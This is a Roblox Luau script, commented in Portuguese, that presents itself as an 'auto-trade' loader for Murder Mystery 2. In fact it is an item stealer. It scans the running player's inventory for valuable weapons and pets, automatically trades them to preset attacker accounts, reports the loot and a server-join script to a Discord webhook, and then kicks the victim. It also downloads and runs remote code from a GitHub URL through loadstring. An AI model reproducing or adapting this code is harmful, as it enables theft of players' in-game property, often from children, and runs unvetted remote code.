-- ═══════════════════════════════════════════════════════════════
--  MM2 Auto-Trade | Loader Remoto
--  Revisado contra decompilação do TradeModule / InventoryModule
--  Language: Luau (Roblox Client)
-- ═══════════════════════════════════════════════════════════════

-- ─── 1. CONFIG INGEST ──────────────────────────────────────────
local Config = _G.MM2AutoTradeConfig
if type(Config) ~= "table" then
    warn("[MM2 Loader] _G.MM2AutoTradeConfig ausente ou inválida.")
    return
end

local Username = Config.Username
local MinValue = Config.MinValue
local Webhook = Config.Webhook

if type(Username) ~= "table" or #Username == 0 then
    warn("[MM2 Loader] Username deve ser uma tabela não-vazia.")
    return
end
if type(MinValue) ~= "number" then
    warn("[MM2 Loader] MinValue deve ser um número.")
    return
end
if type(Webhook) ~= "string" or Webhook == "" then
    warn("[MM2 Loader] Webhook inválido.")
    return
end

-- ─── 2. SERVIÇOS ───────────────────────────────────────────────
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local MarketplaceService = game:GetService("MarketplaceService")

local LocalPlayer = Players.LocalPlayer

-- ─── 3. REMOTES DE TRADE ───────────────────────────────────────
-- VERIFICADO: TradeModule.txt referencia game.ReplicatedStorage.Trade
local TradeFolder = ReplicatedStorage:WaitForChild("Trade", 10)
if not TradeFolder then
    warn("[MM2 Loader] TradeFolder não encontrado em ReplicatedStorage.")
    return
end

-- Tipos verificados contra uso em TradeModule.txt:
-- RemoteFunction: SendRequest (InvokeServer / OnClientInvoke)
-- RemoteEvent: todos os demais (FireServer / OnClientEvent)
local SendRequest      = TradeFolder:WaitForChild("SendRequest")      -- RemoteFunction
local AcceptRequest    = TradeFolder:WaitForChild("AcceptRequest")    -- RemoteEvent
local DeclineRequest   = TradeFolder:WaitForChild("DeclineRequest")   -- RemoteEvent
local CancelRequest    = TradeFolder:WaitForChild("CancelRequest")    -- RemoteEvent
local OfferItem        = TradeFolder:WaitForChild("OfferItem")        -- RemoteEvent
local RemoveOffer      = TradeFolder:WaitForChild("RemoveOffer")      -- RemoteEvent
local AcceptTrade      = TradeFolder:WaitForChild("AcceptTrade")      -- RemoteEvent (FireServer + OnClientEvent)
local DeclineTrade     = TradeFolder:WaitForChild("DeclineTrade")     -- RemoteEvent
local CancelAccept     = TradeFolder:WaitForChild("CancelAccept")     -- RemoteEvent
local UpdateTrade      = TradeFolder:WaitForChild("UpdateTrade")      -- RemoteEvent
local StartTrade       = TradeFolder:WaitForChild("StartTrade")       -- RemoteEvent
local RequestSent      = TradeFolder:WaitForChild("RequestSent")      -- RemoteEvent

-- ─── 4. DADOS DO JOGO ──────────────────────────────────────────
-- VERIFICADO: InventoryModule.txt e InventoryPhone.txt
local ProfileData = require(ReplicatedStorage:WaitForChild("Modules"):WaitForChild("ProfileData"))
local SyncData    = require(ReplicatedStorage:WaitForChild("Database"):WaitForChild("Sync"))

-- ─── 5. ESTADO ─────────────────────────────────────────────────
local weaponValues = {}
local lastOffer = 0
local tradeActive = false

-- ─── 6. UTILITÁRIOS HTTP ───────────────────────────────────────
local function httpRequest(data)
    local req = request
        or (syn and syn.request)
        or (http_request)
        or (fluxus and fluxus.request)
        or (delta and delta.request)
        or (identifyexecutor and function(d)
            return {Body = game:HttpGet(d.Url, true), StatusCode = 200}
        end)

    if req then
        local s, r = pcall(function() return req(data) end)
        return s and r or nil
    end
    return nil
end

local function httpGet(url)
    local success, response = pcall(function()
        if game.HttpGet then
            return game:HttpGet(url, true)
        elseif syn and syn.request then
            local r = syn.request({Url = url, Method = "GET"})
            return r and r.Body
        elseif request then
            local r = request({Url = url, Method = "GET"})
            return r and r.Body
        end
        return nil
    end)
    return success and response or nil
end

-- ─── 7. DETECTOR DE EXECUTOR ───────────────────────────────────
local function getExecutor()
    if type(identifyexecutor) == "function" then
        return identifyexecutor()
    elseif type(getexecutorname) == "function" then
        return getexecutorname()
    elseif syn then
        return "Synapse X"
    elseif KRNL_LOADED then
        return "KRNL"
    elseif fluxus then
        return "Fluxus"
    elseif electron then
        return "Electron"
    elseif codex then
        return "Codex"
    elseif delta then
        return "Delta"
    elseif is_sirhurt_closure then
        return "SirHurt"
    elseif pebc_execute then
        return "Panda"
    elseif gethui then
        return "Unknown (Hydrogen/Fluxus family)"
    else
        return "Unknown"
    end
end

-- ─── 8. CARREGAR TABELA DE VALORES ────────────────────────────
-- Fonte: RAW do GitHub. O arquivo contém a declaração de weaponValues.
-- Estratégia robusta: tenta executar como está; se não retornar tabela,
-- injeta "return weaponValues" no final.
local function loadWeaponValues()
    local url = "https://raw.githubusercontent.com/xspeedHub002/Hs62jsgp810i/refs/heads/main/mm2val.lua.txt"
    local raw = httpGet(url)
    if not raw or raw == "" then
        warn("[MM2 Loader] Falha ao baixar tabela de valores (resposta vazia).")
        return false
    end

    -- Estratégia 1: arquivo já contém return
    local chunk, err = loadstring(raw, "WeaponValues")
    if chunk then
        local ok, result = pcall(chunk)
        if ok and type(result) == "table" then
            weaponValues = result
            return true
        end
    end

    -- Estratégia 2: injetar return weaponValues no final
    chunk, err = loadstring(raw .. "
return weaponValues", "WeaponValues")
    if chunk then
        local ok, result = pcall(chunk)
        if ok and type(result) == "table" then
            weaponValues = result
            return true
        end
    end

    -- Estratégia 3: remover 'local' da declaração e retornar
    local modified = raw:gsub("local%s+weaponValues", "weaponValues") .. "
return weaponValues"
    chunk, err = loadstring(modified, "WeaponValues")
    if chunk then
        local ok, result = pcall(chunk)
        if ok and type(result) == "table" then
            weaponValues = result
            return true
        end
    end

    warn("[MM2 Loader] Não foi possível parsear weaponValues do RAW.")
    return false
end

-- ─── 9. RESOLVER VALOR DO ITEM ─────────────────────────────────
-- VERIFICADO: a tabela baixada é categorizada (Chroma, Godly, etc.)
local function getItemValue(itemName)
    for categoryName, categoryTable in pairs(weaponValues) do
        if type(categoryTable) == "table" and categoryTable[itemName] then
            return categoryTable[itemName]
        end
    end
    return 0
end

-- ─── 10. ESCANEAR INVENTÁRIO ───────────────────────────────────
-- VERIFICADO: caminhos extraídos de InventoryModule.txt e InventoryPhone.txt
local function scanInventory()
    local loot = {}
    local totalValue = 0

    -- Weapons normais
    -- VERIFICADO: ProfileData.Weapons.Owned é tabela { [ItemID] = quantidade }
    if ProfileData.Weapons and type(ProfileData.Weapons.Owned) == "table" then
        for itemID, amount in pairs(ProfileData.Weapons.Owned) do
            if itemID == "DefaultKnife" or itemID == "DefaultGun" then
                continue
            end
            local qty = tonumber(amount) or 1
            local val = getItemValue(itemID)
            if val >= MinValue then
                table.insert(loot, {
                    Name = itemID,
                    Value = val,
                    Amount = qty,
                    Type = "Weapons"
                })
                totalValue = totalValue + (val * qty)
            end
        end
    end

    -- Uniques (evoluídos)
    -- VERIFICADO: ProfileData.Uniques é array de objetos {BaseItem, EvoEquipped, XP, ...}
    if ProfileData.Uniques and type(ProfileData.Uniques) == "table" then
        for _, unique in pairs(ProfileData.Uniques) do
            local baseItem = unique.BaseItem
            if unique.EvoEquipped then
                -- VERIFICADO: SyncData.Weapons[baseItem].Evo contém os estágios
                local evoBase = SyncData.Weapons[baseItem]
                if evoBase and type(evoBase.Evo) == "table" then
                    local evoLevel = 1
                    for i = 1, #evoBase.Evo do
                        if unique.XP >= evoBase.Evo[i].XPRequired then
                            evoLevel = i
                        end
                    end
                    baseItem = evoBase.Evo[evoLevel].ItemName
                end
            end
            local val = getItemValue(baseItem)
            if val >= MinValue then
                table.insert(loot, {
                    Name = baseItem,
                    Value = val,
                    Amount = 1,
                    Type = "Weapons",
                    Unique = true
                })
                totalValue = totalValue + val
            end
        end
    end

    -- Pets
    -- NOTA: Pets usam a mesma tabela de valores; se não estiverem lá, valor = 0.
    if ProfileData.Pets and type(ProfileData.Pets.Owned) == "table" then
        for itemID, amount in pairs(ProfileData.Pets.Owned) do
            local qty = tonumber(amount) or 1
            local val = getItemValue(itemID)
            if val >= MinValue then
                table.insert(loot, {
                    Name = itemID,
                    Value = val,
                    Amount = qty,
                    Type = "Pets"
                })
                totalValue = totalValue + (val * qty)
            end
        end
    end

    return loot, totalValue
end

-- ─── 11. WEBHOOK DISCORD ───────────────────────────────────────
local function sendWebhook(status, loot, totalValue)
    local gameName = "Murder Mystery 2"
    pcall(function()
        local info = MarketplaceService:GetProductInfo(game.PlaceId)
        if info and info.Name then
            gameName = info.Name
        end
    end)

    local jobId = game.JobId
    local executorName = getExecutor()
    local joinScript = string.format(
        'game:GetService("TeleportService"):TeleportToPlaceInstance(%d, "%s")',
        game.PlaceId,
        jobId
    )

    local lootText = ""
    for _, item in pairs(loot) do
        lootText = lootText .. string.format("%s (x%d) — %d value
", item.Name, item.Amount, item.Value)
    end
    if lootText == "" then
        lootText = "Nenhum item encontrado acima do valor mínimo."
    end

    local statusEmoji = "⚪"
    local statusText = "In-Game"
    local color = 0xffff00

    if status == "claimed" then
        statusEmoji = "🟢"
        statusText = "Claimed"
        color = 0x00ff00
    elseif status == "private" then
        statusEmoji = "🔴"
        statusText = "Private Server / Kicked"
        color = 0xff0000
    end

    local payload = {
        content = "@everyone",
        embeds = {{
            title = "MM2 Auto-Trade Log",
            color = color,
            fields = {
                {name = "Nick", value = LocalPlayer.Name, inline = true},
                {name = "Status", value = statusEmoji .. " " .. statusText, inline = true},
                {name = "🎮 Game", value = gameName, inline = true},
                {name = "⚡ Executor", value = executorName, inline = true},
                {name = "💻 Server", value = "```" .. jobId .. "```", inline = false},
                {name = "📜 Join Script", value = "```lua
" .. joinScript .. "
```", inline = false},
                {name = "📦 Loot", value = "```
" .. lootText .. "
```", inline = false},
                {name = "💰 Total Value", value = tostring(totalValue), inline = true}
            },
            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
            footer = {text = "MM2 Auto-Trade | " .. os.date("%H:%M:%S")}
        }}
    }

    local body = HttpService:JSONEncode(payload)
    httpRequest({
        Url = Webhook,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = body
    })
end

-- ─── 12. ENCONTRAR ALVO ────────────────────────────────────────
local function findTarget()
    for _, name in pairs(Username) do
        local player = Players:FindFirstChild(name)
        if player then
            return player
        end
    end
    return nil
end

-- ─── 13. AGRUPAR ITENS POR TRADE ───────────────────────────────
-- NOTA: O TradeModule decompilado não expõe limite de slots no código,
-- mas o GUI do jogo impõe 4 slots distintos por trade. Cada slot pode
-- conter quantidade > 1. Como 'loot' já contém apenas tipos distintos,
-- agrupamos de 4 em 4 entradas.
local function groupTrades(loot)
    local batches = {}
    local current = {}

    for i, item in ipairs(loot) do
        table.insert(current, item)
        if #current >= 4 then
            table.insert(batches, current)
            current = {}
        end
    end

    if #current > 0 then
        table.insert(batches, current)
    end

    return batches
end

-- ─── 14. RASTREAR LASTOFFER ────────────────────────────────────
-- VERIFICADO: UpdateTrade dispara tradeData com campo LastOffer (número)
UpdateTrade.OnClientEvent:Connect(function(tradeData)
    if tradeData and tradeData.LastOffer then
        lastOffer = tradeData.LastOffer
    end
    if tradeData and tradeData.Player1 and tradeData.Player2 then
        if tradeData.Player1.Player == LocalPlayer or tradeData.Player2.Player == LocalPlayer then
            tradeActive = true
        end
    end
end)

-- ─── 15. OFERECER ITENS ────────────────────────────────────────
-- VERIFICADO: TradeModule.txt mostra OfferItem:FireServer(ItemID, ItemType)
-- Cada chamada adiciona 1 unidade ao slot correspondente.
local function offerItems(items)
    for _, item in pairs(items) do
        for i = 1, item.Amount do
            OfferItem:FireServer(item.Name, item.Type)
            task.wait(0.12)
        end
    end
end

-- ─── 16. EXECUTAR TRADE ────────────────────────────────────────
local function executeTrade(targetPlayer, items)
    tradeActive = false
    lastOffer = 0

    local requestAccepted = false
    local tradeData = nil

    local connStart = StartTrade.OnClientEvent:Connect(function(data, partnerName)
        if partnerName == targetPlayer.Name then
            tradeData = data
            requestAccepted = true
        end
    end)

    local connDecline = DeclineRequest.OnClientEvent:Connect(function()
        requestAccepted = false
    end)

    -- VERIFICADO: SendRequest é RemoteFunction; argumento é o Player object.
    local sendSuccess, sendResult = pcall(function()
        return SendRequest:InvokeServer(targetPlayer)
    end)

    if not sendSuccess then
        connStart:Disconnect()
        connDecline:Disconnect()
        warn("[Trade] Falha ao invocar SendRequest: " .. tostring(sendResult))
        return false
    end

    -- NOTA: TradeModule.txt verifica 'if not SendRequest:InvokeServer(...) then'.
    -- Se o retorno for truthy, pode indicar erro/recusa imediata.
    if sendResult then
        connStart:Disconnect()
        connDecline:Disconnect()
        warn("[Trade] SendRequest retornou truthy (possível recusa imediata).")
        return false
    end

    local startTime = tick()
    while not requestAccepted and tick() - startTime < 15 do
        task.wait(0.1)
    end

    connStart:Disconnect()
    connDecline:Disconnect()

    if not requestAccepted or not tradeData then
        warn("[Trade] Pedido recusado ou timeout.")
        return false
    end

    task.wait(0.4)

    -- Adiciona itens à oferta
    offerItems(items)

    task.wait(0.4)

    -- Cooldown obrigatório de 6s antes do aceite
    -- VERIFICADO: TradeModule.txt implementa cooldown de 6 segundos (v_u_86 = 6)
    task.wait(6.5)

    -- CORREÇÃO: Envia AcceptTrade APENAS UMA VEZ.
    -- VERIFICADO: TradeModule.txt mostra um único FireServer(game.PlaceId * 3, lastOffer)
    AcceptTrade:FireServer(game.PlaceId * 3, lastOffer)

    -- Aguarda confirmação do servidor
    local confirmed = false
    local connConfirm = AcceptTrade.OnClientEvent:Connect(function(success, receivedItems)
        if success then
            confirmed = true
        end
    end)

    local confirmStart = tick()
    while not confirmed and tick() - confirmStart < 12 do
        task.wait(0.1)
    end

    connConfirm:Disconnect()

    if not confirmed then
        warn("[Trade] Confirmação não recebida. Declinando.")
        pcall(function() DeclineTrade:FireServer() end)
        return false
    end

    return true
end

-- ─── 17. LOOP PRINCIPAL ────────────────────────────────────────
local function main()
    local loaded = loadWeaponValues()
    if not loaded then
        task.wait(2)
    end

    task.wait(1)

    local loot, totalValue = scanInventory()

    -- Webhook inicial (In-Game)
    sendWebhook("ingame", loot, totalValue)

    -- Detectar Private Server
    local isPrivate = (game.PrivateServerId ~= "" and game.PrivateServerId ~= nil)
        or (game.PrivateServerOwnerId ~= 0 and game.PrivateServerOwnerId ~= nil)

    if isPrivate then
        sendWebhook("private", loot, totalValue)
    end

    if #loot == 0 then
        warn("[Loader] Nenhum item acima do valor mínimo. Encerrando.")
        task.wait(2)
        LocalPlayer:Kick("Nil")
        return
    end

    -- Aguarda alvo
    local target = findTarget()
    if not target then
        local connAdded = Players.PlayerAdded:Connect(function(player)
            for _, name in pairs(Username) do
                if player.Name == name then
                    target = player
                end
            end
        end)

        while not target do
            task.wait(0.5)
        end

        connAdded:Disconnect()
    end

    task.wait(1)

    local tradeBatches = groupTrades(loot)

    for i, batch in ipairs(tradeBatches) do
        local success = executeTrade(target, batch)
        if not success then
            warn("[Trade] Falha no trade batch " .. i .. ". Abortando sequência.")
            break
        end
        if i < #tradeBatches then
            task.wait(2.5)
        end
    end

    sendWebhook("claimed", loot, totalValue)

    task.wait(1)
    LocalPlayer:Kick("Nil")
end

-- ─── INICIALIZAÇÃO ─────────────────────────────────────────────
main()
